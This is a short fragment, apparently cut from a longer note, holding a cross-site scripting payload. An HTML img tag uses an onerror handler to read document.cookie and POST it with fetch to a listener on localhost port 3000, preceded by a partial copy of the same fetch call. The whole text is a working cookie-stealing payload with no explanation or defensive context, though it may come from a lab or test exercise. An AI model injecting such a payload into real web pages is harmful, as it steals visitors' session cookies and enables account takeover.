'http://localhost:3000/?cookies='+cookies, {
  method: 'POST',
  headers: {
    'Content-type': 'application/json; charset=UTF-8'
  }
}


<img src="x" onerror="var cookies=document.cookie; fetch('http://127.0.0.1:3000/?cookies=test'+cookies, {
  method: 'POST',
  headers: {
    'Content-type': 'application/json; charset=UTF-8'
  }
})">